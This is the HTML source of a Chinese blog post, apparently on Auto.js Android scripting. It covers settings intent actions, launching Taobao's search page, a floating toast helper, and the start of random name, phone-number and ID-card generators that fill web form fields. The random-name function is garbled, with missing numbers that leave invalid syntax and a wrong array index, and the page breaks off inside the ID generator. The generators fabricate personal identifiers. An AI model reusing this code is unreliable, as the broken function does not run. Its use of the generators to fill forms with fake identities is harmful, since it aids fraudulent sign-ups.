class="line">intent.setAction(<span class="string">&quot;android.settings.LOCALE_SETTINGS&quot;</span>); <span class="comment">//语言偏好设置</span></span><br><span class="line">intent.setAction(<span class="string">&quot;android.settings.LOCATION_SOURCE_SETTINGS&quot;</span>); <span class="comment">//定位服务设置</span></span><br><span class="line">intent.setAction(<span class="string">&quot;android.settings.MANAGE_ALL_APPLICATIONS_SETTINGS&quot;</span>); <span class="comment">//所有应用</span></span><br><span class="line">intent.setAction(<span class="string">&quot;android.settings.MANAGE_APPLICATIONS_SETTINGS&quot;</span>); <span class="comment">//应用管理</span></span><br><span class="line">intent.setAction(<span class="string">&quot;android.settings.MANAGE_DEFAULT_APPS_SETTINGS&quot;</span>); <span class="comment">//与ACTION_HOME_SETTINGS相同</span></span><br><span class="line">intent.setAction(<span class="string">&quot;android.settings.action.MANAGE_OVERLAY_PERMISSION&quot;</span>); <span class="comment">//在其他应用上层显示,悬浮窗</span></span><br><span class="line">intent.setAction(<span class="string">&quot;android.settings.MANAGE_UNKNOWN_APP_SOURCES&quot;</span>); <span class="comment">//安装未知应用 安卓8.0</span></span><br><span class="line">intent.setAction(<span class="string">&quot;android.settings.action.MANAGE_WRITE_SETTINGS&quot;</span>); <span class="comment">//可修改系统设置 权限</span></span><br><span class="line">intent.setAction(<span class="string">&quot;android.settings.MEMORY_CARD_SETTINGS&quot;</span>); <span class="comment">//内存与存储</span></span><br><span class="line">intent.setAction(<span class="string">&quot;android.settings.NETWORK_OPERATOR_SETTINGS&quot;</span>); <span class="comment">//可用网络选择</span></span><br><span class="line">intent.setAction(<span class="string">&quot;android.settings.NFCSHARING_SETTINGS&quot;</span>); <span class="comment">//NFC设置</span></span><br><span class="line">intent.setAction(<span class="string">&quot;android.settings.NFC_SETTINGS&quot;</span>); <span class="comment">//网络中的 更多设置</span></span><br><span class="line">intent.setAction(<span class="string">&quot;android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS&quot;</span>); <span class="comment">//通知权限设置</span></span><br><span class="line">intent.setAction(<span class="string">&quot;android.settings.NOTIFICATION_POLICY_ACCESS_SETTINGS&quot;</span>); <span class="comment">//勿扰权限设置</span></span><br><span class="line">intent.setAction(<span class="string">&quot;android.settings.ACTION_PRINT_SETTINGS&quot;</span>); <span class="comment">//打印服务设置</span></span><br><span class="line">intent.setAction(<span class="string">&quot;android.settings.PRIVACY_SETTINGS&quot;</span>); <span class="comment">//备份和重置</span></span><br><span class="line">intent.setAction(<span class="string">&quot;android.settings.SECURITY_SETTINGS&quot;</span>); <span class="comment">//安全设置</span></span><br><span class="line">intent.setAction(<span class="string">&quot;android.settings.SHOW_REGULATORY_INFO&quot;</span>); <span class="comment">//监管信息</span></span><br><span class="line">intent.setAction(<span class="string">&quot;android.settings.SOUND_SETTINGS&quot;</span>); <span class="comment">//声音设置</span></span><br><span class="line">intent.setAction(<span class="string">&quot;android.settings.SYNC_SETTINGS&quot;</span>); <span class="comment">//添加账户设置</span></span><br><span class="line">intent.setAction(<span class="string">&quot;android.settings.USAGE_ACCESS_SETTINGS&quot;</span>); <span class="comment">//有权查看使用情况的应用</span></span><br><span class="line">intent.setAction(<span class="string">&quot;android.settings.USER_DICTIONARY_SETTINGS&quot;</span>); <span class="comment">//个人词典</span></span><br><span class="line">intent.setAction(<span class="string">&quot;android.settings.VOICE_INPUT_SETTINGS&quot;</span>); <span class="comment">//辅助应用和语音输入</span></span><br><span class="line">intent.setAction(<span class="string">&quot;android.settings.VPN_SETTINGS&quot;</span>); <span class="comment">//VPN设置</span></span><br><span class="line">intent.setAction(<span class="string">&quot;android.settings.VR_LISTENER_SETTINGS&quot;</span>); <span class="comment">//VR助手</span></span><br><span class="line">intent.setAction(<span class="string">&quot;android.settings.WEBVIEW_SETTINGS&quot;</span>); <span class="comment">//选择webview</span></span><br><span class="line">intent.setAction(<span class="string">&quot;android.settings.WIFI_IP_SETTINGS&quot;</span>); <span class="comment">//高级WLAN设置</span></span><br><span class="line">intent.setAction(<span class="string">&quot;android.settings.WIFI_SETTINGS&quot;</span>); <span class="comment">//选择WIFI,连接WIFI</span></span><br><span class="line">intent.setAction(<span class="string">&quot;com.android.settings.Settings$DevelopmentSettingsActivity&quot;</span>);</span><br><span class="line"></span><br><span class="line">app.startActivity(intent);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Intent查找, 先准备工具：Activity管理器,点击认为是正确的Activity，测试看看是否正确，搜索一般内含Search。找到正确能打开淘宝搜索页的出来。<br>找到后就是写代码调用了。这里找出来正确的<code>&quot;com.taobao.search.searchdoor.SearchDoorActivity&quot;</code>。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">app.startActivity(&#123;</span><br><span class="line">action: <span class="string">&quot;View&quot;</span>,</span><br><span class="line">packageName: <span class="string">&quot;com.taobao.taobao&quot;</span>,</span><br><span class="line">className: <span class="string">&quot;com.taobao.search.searchdoor.SearchDoorActivity&quot;</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>运行就可以自动打开淘宝app的搜索页面出来了。</p><h2 id="4-增强版toast-带有时间参数"><a href="#4-增强版toast-带有时间参数" class="headerlink" title="4. 增强版toast,带有时间参数"></a>4. 增强版<code>toast</code>,带有时间参数</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">toasts</span>(<span class="params">text, time</span>) </span>&#123;</span><br><span class="line">    text = text || <span class="literal">null</span>;</span><br><span class="line">    time = time || <span class="number">2500</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">isNaN</span>(time)) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">let</span> arr = engines.all(),</span><br><span class="line">        run = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">for</span> (i <span class="keyword">in</span> arr) &#123;</span><br><span class="line">        <span class="keyword">if</span> (files.getName(arr[i].getSource()) == <span class="string">&quot;toast.js&quot;</span>) &#123;</span><br><span class="line">            run = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!run) &#123;</span><br><span class="line">        <span class="keyword">let</span> tex = <span class="string">&quot;var t = toasts();\nevents.broadcast.on(\&quot;toast\&quot;, (arr) =&gt; &#123;\nif (arr.length != 2) return;\nlet time = new Number(arr[1][1]),text = arr[1][0];\nif(isNaN(time)) time = 5000;\nif(!text) return;\nt(text, time);&#125;);\nsetInterval(() =&gt; &#123;&#125;, 10000);\nfunction toasts() &#123;\nvar th = \&quot;\&quot;,Y = device.width / 4,X = Y,x = Y * 2;\nvar flo = floaty.rawWindow(\n&lt;frame gravity=\&quot;center\&quot; bg=\&quot;#00000000\&quot;&gt;\n&lt;text id=\&quot;message\&quot;  bg=\&quot;#70000000\&quot; textColor=\&quot;#ffffff\&quot; textSize=\&quot;18sp\&quot; gravity=\&quot;center\&quot; w=\&quot;auto\&quot; padding=\&quot;1\&quot;/&gt;\n&lt;/frame&gt;);\nflo.setTouchable(false);\nflo.setSize(0, 0);\nreturn doflo;\nfunction doflo(mes, time) &#123;\nmes = \&quot; \&quot; + mes.toString().split(\&quot;\\n\&quot;).join(\&quot; \\n \&quot;) + \&quot; \&quot;;\nif (th != \&quot;\&quot;) &#123;\nth.interrupt();\nth = \&quot;\&quot;;&#125;\nui.run(function() &#123;\nflo.message.setText(mes);&#125;);\nflo.setPosition(X, Y);\nflo.setSize(x, -2);\nth = threads.start(function() &#123;\nsleep(time);\nui.run(function() &#123;\nflo.message.setText(\&quot;\&quot;);&#125;);\nflo.setSize(0, 0);\nth = \&quot;\&quot;;&#125;);&#125;&#125;&quot;</span>;</span><br><span class="line">        engines.execScript(<span class="string">&quot;toast&quot;</span>, tex);</span><br><span class="line">        sleep(<span class="number">500</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    events.broadcast.emit(<span class="string">&quot;toast&quot;</span>, [[engines.myEngine(),[text, time]]]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="5-获取随机相关函数"><a href="#5-获取随机相关函数" class="headerlink" title="5. 获取随机相关函数"></a>5. 获取随机相关函数</h2><p>参考代码: <a href="https://easydoc.xyz/doc/25791054/uw2FUUiw/QzYbygUV" target="_blank" rel="noopener">https://easydoc.xyz/doc/25791054/uw2FUUiw/QzYbygUV</a></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//取随机姓名</span></span><br><span class="line"><span class="comment">//此代码由飞云脚本圈整理（www.feiyunjs.com）</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getRndName</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">//以下字库可自行添加</span></span><br><span class="line">    <span class="keyword">var</span> familyNames = <span class="keyword">new</span> <span class="built_in">Array</span>(</span><br><span class="line">        <span class="string">&quot;赵&quot;</span>, <span class="string">&quot;钱&quot;</span>, <span class="string">&quot;孙&quot;</span>, <span class="string">&quot;李&quot;</span>, <span class="string">&quot;周&quot;</span>, <span class="string">&quot;吴&quot;</span>, <span class="string">&quot;郑&quot;</span>, <span class="string">&quot;王&quot;</span>, <span class="string">&quot;冯&quot;</span>, <span class="string">&quot;陈&quot;</span>,</span><br><span class="line">        <span class="string">&quot;褚&quot;</span>, <span class="string">&quot;卫&quot;</span>, <span class="string">&quot;蒋&quot;</span>, <span class="string">&quot;沈&quot;</span>, <span class="string">&quot;韩&quot;</span>, <span class="string">&quot;杨&quot;</span>, <span class="string">&quot;朱&quot;</span>, <span class="string">&quot;秦&quot;</span>, <span class="string">&quot;尤&quot;</span>, <span class="string">&quot;许&quot;</span>,</span><br><span class="line">        <span class="string">&quot;何&quot;</span>, <span class="string">&quot;吕&quot;</span>, <span class="string">&quot;施&quot;</span>, <span class="string">&quot;张&quot;</span>, <span class="string">&quot;孔&quot;</span>, <span class="string">&quot;曹&quot;</span>, <span class="string">&quot;严&quot;</span>, <span class="string">&quot;华&quot;</span>, <span class="string">&quot;金&quot;</span>, <span class="string">&quot;魏&quot;</span>,</span><br><span class="line">        <span class="string">&quot;陶&quot;</span>, <span class="string">&quot;姜&quot;</span>, <span class="string">&quot;戚&quot;</span>, <span class="string">&quot;谢&quot;</span>, <span class="string">&quot;邹&quot;</span>, <span class="string">&quot;喻&quot;</span>, <span class="string">&quot;柏&quot;</span>, <span class="string">&quot;水&quot;</span>, <span class="string">&quot;窦&quot;</span>, <span class="string">&quot;章&quot;</span>,</span><br><span class="line">        <span class="string">&quot;云&quot;</span>, <span class="string">&quot;苏&quot;</span>, <span class="string">&quot;潘&quot;</span>, <span class="string">&quot;葛&quot;</span>, <span class="string">&quot;奚&quot;</span>, <span class="string">&quot;范&quot;</span>, <span class="string">&quot;彭&quot;</span>, <span class="string">&quot;郎&quot;</span>, <span class="string">&quot;鲁&quot;</span>, <span class="string">&quot;韦&quot;</span>,</span><br><span class="line">        <span class="string">&quot;昌&quot;</span>, <span class="string">&quot;马&quot;</span>, <span class="string">&quot;苗&quot;</span>, <span class="string">&quot;凤&quot;</span>, <span class="string">&quot;花&quot;</span>, <span class="string">&quot;方&quot;</span>, <span class="string">&quot;俞&quot;</span>, <span class="string">&quot;任&quot;</span>, <span class="string">&quot;袁&quot;</span>, <span class="string">&quot;柳&quot;</span>,</span><br><span class="line">        <span class="string">&quot;酆&quot;</span>, <span class="string">&quot;鲍&quot;</span>, <span class="string">&quot;史&quot;</span>, <span class="string">&quot;唐&quot;</span>, <span class="string">&quot;费&quot;</span>, <span class="string">&quot;廉&quot;</span>, <span class="string">&quot;岑&quot;</span>, <span class="string">&quot;薛&quot;</span>, <span class="string">&quot;雷&quot;</span>, <span class="string">&quot;贺&quot;</span>,</span><br><span class="line">        <span class="string">&quot;倪&quot;</span>, <span class="string">&quot;汤&quot;</span>, <span class="string">&quot;滕&quot;</span>, <span class="string">&quot;殷&quot;</span>, <span class="string">&quot;罗&quot;</span>, <span class="string">&quot;毕&quot;</span>, <span class="string">&quot;郝&quot;</span>, <span class="string">&quot;邬&quot;</span>, <span class="string">&quot;安&quot;</span>, <span class="string">&quot;常&quot;</span>,</span><br><span class="line">        <span class="string">&quot;乐&quot;</span>, <span class="string">&quot;于&quot;</span>, <span class="string">&quot;时&quot;</span>, <span class="string">&quot;傅&quot;</span>, <span class="string">&quot;皮&quot;</span>, <span class="string">&quot;卞&quot;</span>, <span class="string">&quot;齐&quot;</span>, <span class="string">&quot;康&quot;</span>, <span class="string">&quot;伍&quot;</span>, <span class="string">&quot;余&quot;</span>,</span><br><span class="line">        <span class="string">&quot;元&quot;</span>, <span class="string">&quot;卜&quot;</span>, <span class="string">&quot;顾&quot;</span>, <span class="string">&quot;孟&quot;</span>, <span class="string">&quot;平&quot;</span>, <span class="string">&quot;黄&quot;</span>, <span class="string">&quot;和&quot;</span>, <span class="string">&quot;穆&quot;</span>, <span class="string">&quot;萧&quot;</span>, <span class="string">&quot;尹&quot;</span>,</span><br><span class="line">        <span class="string">&quot;司马&quot;</span>,<span class="string">&quot;欧阳&quot;</span>,<span class="string">&quot;上官&quot;</span>,<span class="string">&quot;夏侯夏侯&quot;</span>,<span class="string">&quot;诸葛&quot;</span>,<span class="string">&quot;西门&quot;</span>,<span class="string">&quot;南宫&quot;</span>,<span class="string">&quot;东郭&quot;</span>,</span><br><span class="line">        <span class="string">&quot;百里&quot;</span>,<span class="string">&quot;尉迟&quot;</span>,<span class="string">&quot;端木&quot;</span>,<span class="string">&quot;皇甫&quot;</span>,<span class="string">&quot;钟离&quot;</span>,<span class="string">&quot;宇文&quot;</span>,<span class="string">&quot;长孙&quot;</span>,<span class="string">&quot;慕容&quot;</span>,<span class="string">&quot;司徒&quot;</span>,<span class="string">&quot;司空&quot;</span>,<span class="string">&quot;东方&quot;</span>,<span class="string">&quot;公孙&quot;</span>,<span class="string">&quot;令狐&quot;</span></span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">var</span> givenNames = <span class="keyword">new</span> <span class="built_in">Array</span>(</span><br><span class="line">        <span class="string">&quot;子璇&quot;</span>, <span class="string">&quot;淼&quot;</span>, <span class="string">&quot;国栋&quot;</span>, <span class="string">&quot;夫子&quot;</span>, <span class="string">&quot;瑞堂&quot;</span>, <span class="string">&quot;甜&quot;</span>, <span class="string">&quot;敏&quot;</span>, <span class="string">&quot;尚&quot;</span>, <span class="string">&quot;国贤&quot;</span>, <span class="string">&quot;贺祥&quot;</span>, <span class="string">&quot;晨涛&quot;</span>,</span><br><span class="line">        <span class="string">&quot;昊轩&quot;</span>, <span class="string">&quot;易轩&quot;</span>, <span class="string">&quot;益辰&quot;</span>, <span class="string">&quot;益帆&quot;</span>, <span class="string">&quot;益冉&quot;</span>, <span class="string">&quot;瑾春&quot;</span>, <span class="string">&quot;瑾昆&quot;</span>, <span class="string">&quot;春齐&quot;</span>, <span class="string">&quot;杨&quot;</span>, <span class="string">&quot;文昊&quot;</span>,</span><br><span class="line">        <span class="string">&quot;东东&quot;</span>, <span class="string">&quot;雄霖&quot;</span>, <span class="string">&quot;浩晨&quot;</span>, <span class="string">&quot;熙涵&quot;</span>, <span class="string">&quot;溶溶&quot;</span>, <span class="string">&quot;冰枫&quot;</span>, <span class="string">&quot;欣欣&quot;</span>, <span class="string">&quot;宜豪&quot;</span>, <span class="string">&quot;欣慧&quot;</span>, <span class="string">&quot;建政&quot;</span>,</span><br><span class="line">        <span class="string">&quot;美欣&quot;</span>, <span class="string">&quot;淑慧&quot;</span>, <span class="string">&quot;文轩&quot;</span>, <span class="string">&quot;文杰&quot;</span>, <span class="string">&quot;欣源&quot;</span>, <span class="string">&quot;忠林&quot;</span>, <span class="string">&quot;榕润&quot;</span>, <span class="string">&quot;欣汝&quot;</span>, <span class="string">&quot;慧嘉&quot;</span>, <span class="string">&quot;新建&quot;</span>,</span><br><span class="line">        <span class="string">&quot;建林&quot;</span>, <span class="string">&quot;亦菲&quot;</span>, <span class="string">&quot;林&quot;</span>, <span class="string">&quot;冰洁&quot;</span>, <span class="string">&quot;佳欣&quot;</span>, <span class="string">&quot;涵涵&quot;</span>, <span class="string">&quot;禹辰&quot;</span>, <span class="string">&quot;淳美&quot;</span>, <span class="string">&quot;泽惠&quot;</span>, <span class="string">&quot;伟洋&quot;</span>,</span><br><span class="line">        <span class="string">&quot;涵越&quot;</span>, <span class="string">&quot;润丽&quot;</span>, <span class="string">&quot;翔&quot;</span>, <span class="string">&quot;淑华&quot;</span>, <span class="string">&quot;晶莹&quot;</span>, <span class="string">&quot;凌晶&quot;</span>, <span class="string">&quot;苒溪&quot;</span>, <span class="string">&quot;雨涵&quot;</span>, <span class="string">&quot;嘉怡&quot;</span>, <span class="string">&quot;佳毅&quot;</span>,</span><br><span class="line">        <span class="string">&quot;子辰&quot;</span>, <span class="string">&quot;佳琪&quot;</span>, <span class="string">&quot;紫轩&quot;</span>, <span class="string">&quot;瑞辰&quot;</span>, <span class="string">&quot;昕蕊&quot;</span>, <span class="string">&quot;萌&quot;</span>, <span class="string">&quot;明远&quot;</span>, <span class="string">&quot;欣宜&quot;</span>, <span class="string">&quot;泽远&quot;</span>, <span class="string">&quot;欣怡&quot;</span>,</span><br><span class="line">        <span class="string">&quot;佳怡&quot;</span>, <span class="string">&quot;佳惠&quot;</span>, <span class="string">&quot;晨茜&quot;</span>, <span class="string">&quot;晨璐&quot;</span>, <span class="string">&quot;运昊&quot;</span>, <span class="string">&quot;汝鑫&quot;</span>, <span class="string">&quot;淑君&quot;</span>, <span class="string">&quot;晶滢&quot;</span>, <span class="string">&quot;润莎&quot;</span>, <span class="string">&quot;榕汕&quot;</span>,</span><br><span class="line">        <span class="string">&quot;佳钰&quot;</span>, <span class="string">&quot;佳玉&quot;</span>, <span class="string">&quot;晓庆&quot;</span>, <span class="string">&quot;一鸣&quot;</span>, <span class="string">&quot;语晨&quot;</span>, <span class="string">&quot;添池&quot;</span>, <span class="string">&quot;添昊&quot;</span>, <span class="string">&quot;雨泽&quot;</span>, <span class="string">&quot;雅晗&quot;</span>, <span class="string">&quot;雅涵&quot;</span>,</span><br><span class="line">        <span class="string">&quot;清妍&quot;</span>, <span class="string">&quot;诗悦&quot;</span>, <span class="string">&quot;嘉乐&quot;</span>, <span class="string">&quot;晨涵&quot;</span>, <span class="string">&quot;天赫&quot;</span>, <span class="string">&quot;玥傲&quot;</span>, <span class="string">&quot;佳昊&quot;</span>, <span class="string">&quot;天昊&quot;</span>, <span class="string">&quot;萌萌&quot;</span>, <span class="string">&quot;若萌&quot;</span>,</span><br><span class="line">        <span class="string">&quot;惠宁&quot;</span>,<span class="string">&quot;雅欣&quot;</span>,<span class="string">&quot;奕雯&quot;</span>,<span class="string">&quot;佳琪&quot;</span>,<span class="string">&quot;永怡&quot;</span>,<span class="string">&quot;璐瑶&quot;</span>,<span class="string">&quot;娟秀&quot;</span>,<span class="string">&quot;天佳&quot;</span>,<span class="string">&quot;晓华&quot;</span>,<span class="string">&quot;妍丽&quot;</span>,<span class="string">&quot;璇菡&quot;</span>,</span><br><span class="line">        <span class="string">&quot;嘉禾&quot;</span>,<span class="string">&quot;忆辰&quot;</span>,<span class="string">&quot;妍彤&quot;</span>,<span class="string">&quot;眉萱&quot;</span>,<span class="string">&quot;秀辰&quot;</span>,<span class="string">&quot;怡熹&quot;</span>,<span class="string">&quot;思琦&quot;</span>,<span class="string">&quot;弦娇&quot;</span>,<span class="string">&quot;青淑&quot;</span>,<span class="string">&quot;宣淑&quot;</span>,<span class="string">&quot;和静&quot;</span>,</span><br><span class="line">        <span class="string">&quot;雪涵&quot;</span>,<span class="string">&quot;美嘉&quot;</span>,<span class="string">&quot;佳涵&quot;</span>,<span class="string">&quot;旭和&quot;</span>,<span class="string">&quot;丽娇&quot;</span>,<span class="string">&quot;雨晨&quot;</span>,<span class="string">&quot;文惠&quot;</span>,<span class="string">&quot;雅馥&quot;</span>,<span class="string">&quot;雨嘉&quot;</span>,<span class="string">&quot;亦婷&quot;</span>,<span class="string">&quot;秀慧&quot;</span>,</span><br><span class="line">        <span class="string">&quot;俊颖&quot;</span>,<span class="string">&quot;亭清&quot;</span>,<span class="string">&quot;思涵&quot;</span>,<span class="string">&quot;珂嘉&quot;</span>,<span class="string">&quot;蒂莲&quot;</span>,<span class="string">&quot;秀娟&quot;</span>,<span class="string">&quot;晋仪&quot;</span>,<span class="string">&quot;玮菁&quot;</span>,<span class="string">&quot;慧琳&quot;</span>,<span class="string">&quot;丽帆&quot;</span>,<span class="string">&quot;思辰&quot;</span>,</span><br><span class="line">        <span class="string">&quot;宇纯&quot;</span>,<span class="string">&quot;美瑞&quot;</span>,<span class="string">&quot;蕊清&quot;</span>,<span class="string">&quot;秀敏&quot;</span>,<span class="string">&quot;家维&quot;</span>,<span class="string">&quot;宁致&quot;</span>,<span class="string">&quot;婷方&quot;</span>,<span class="string">&quot;燕晨&quot;</span>,<span class="string">&quot;子琳&quot;</span>,<span class="string">&quot;雪菲&quot;</span>,<span class="string">&quot;泓锦&quot;</span>,</span><br><span class="line">        <span class="string">&quot;佳妮&quot;</span>,<span class="string">&quot;初晨&quot;</span>,<span class="string">&quot;芷菡&quot;</span>,<span class="string">&quot;奕可&quot;</span>,<span class="string">&quot;莉姿&quot;</span>,<span class="string">&quot;杏菏&quot;</span>,<span class="string">&quot;韵彩&quot;</span>,<span class="string">&quot;姝慧&quot;</span>,<span class="string">&quot;雪华&quot;</span>,<span class="string">&quot;珊娜&quot;</span>,<span class="string">&quot;秀丽&quot;</span>,</span><br><span class="line">        <span class="string">&quot;箫辉&quot;</span>,<span class="string">&quot;盈初&quot;</span>,<span class="string">&quot;语楚&quot;</span>,<span class="string">&quot;青秋&quot;</span>,<span class="string">&quot;梓菁&quot;</span>,<span class="string">&quot;宝萱&quot;</span></span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">var</span> i = <span class="built_in">parseInt</span>( * <span class="built_in">Math</span>.random()) * + <span class="built_in">parseInt</span>( * <span class="built_in">Math</span>.random());</span><br><span class="line">    <span class="keyword">var</span> familyName = familyNames[i];</span><br><span class="line">    <span class="keyword">var</span> j = <span class="built_in">parseInt</span>( * <span class="built_in">Math</span>.random()) * + <span class="built_in">parseInt</span>( * <span class="built_in">Math</span>.random());</span><br><span class="line">    <span class="keyword">var</span> givenName = givenNames[i];</span><br><span class="line">    <span class="keyword">var</span> name = familyName + givenName;</span><br><span class="line">    <span class="keyword">var</span> x = <span class="built_in">document</span>.getElementsByName(<span class="string">&quot;client_name&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = ; i &lt; x.length; i++) &#123;</span><br><span class="line">        <span class="keyword">var</span> o = x[i];</span><br><span class="line">        o.value = name;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 取随机手机号</span></span><br><span class="line"><span class="comment">//此代码由飞云脚本圈整理（www.feiyunjs.com）</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getRndMoble</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> prefixArray = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="string">&quot;130&quot;</span>, <span class="string">&quot;131&quot;</span>, <span class="string">&quot;132&quot;</span>, <span class="string">&quot;133&quot;</span>, <span class="string">&quot;134&quot;</span>, <span class="string">&quot;135&quot;</span>, <span class="string">&quot;137&quot;</span>, <span class="string">&quot;138&quot;</span>,</span><br><span class="line">        <span class="string">&quot;170&quot;</span>, <span class="string">&quot;187&quot;</span>, <span class="string">&quot;189&quot;</span>, <span class="string">&quot;199&quot;</span>, <span class="string">&quot;198&quot;</span>, <span class="string">&quot;156&quot;</span>, <span class="string">&quot;166&quot;</span>, <span class="string">&quot;175&quot;</span>, <span class="string">&quot;186&quot;</span>, <span class="string">&quot;184&quot;</span>, <span class="string">&quot;146&quot;</span>, <span class="string">&quot;139&quot;</span>, <span class="string">&quot;147&quot;</span>,</span><br><span class="line">        <span class="string">&quot;150&quot;</span>, <span class="string">&quot;151&quot;</span>, <span class="string">&quot;152&quot;</span>, <span class="string">&quot;157&quot;</span>, <span class="string">&quot;158&quot;</span>, <span class="string">&quot;159&quot;</span>, <span class="string">&quot;178&quot;</span>, <span class="string">&quot;182&quot;</span>, <span class="string">&quot;183&quot;</span>, <span class="string">&quot;187&quot;</span>, <span class="string">&quot;188&quot;</span>, <span class="string">&quot;133&quot;</span>, <span class="string">&quot;153&quot;</span>,</span><br><span class="line">        <span class="string">&quot;149&quot;</span>, <span class="string">&quot;173&quot;</span>, <span class="string">&quot;177&quot;</span>, <span class="string">&quot;180&quot;</span>, <span class="string">&quot;181&quot;</span>, <span class="string">&quot;189&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> i = <span class="built_in">parseInt</span>(<span class="number">10</span> * <span class="built_in">Math</span>.random());</span><br><span class="line">    <span class="keyword">var</span> prefix = prefixArray[i];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; <span class="number">8</span>; j++) &#123;</span><br><span class="line">        prefix = prefix + <span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random() * <span class="number">10</span>);</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">var</span> x = <span class="built_in">document</span>.getElementsByName(<span class="string">&quot;mobile_tel&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; x.length; i++) &#123;</span><br><span class="line">        <span class="keyword">var</span> o = x[i];</span><br><span class="line">        o.value = prefix;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 取随机身份证号</span></span><br><span class="line"><span class="comment">//此代码由飞云脚本圈整理（www.feiyunjs.com）</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getRndID</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> coefficientArray = [<span class="string">&quot;7&quot;</span>, <span class="string">&quot;9&quot;</span>, <span class="string">&quot;10&quot;</span>, <span class="string">&quot;5&quot;</span>, <span 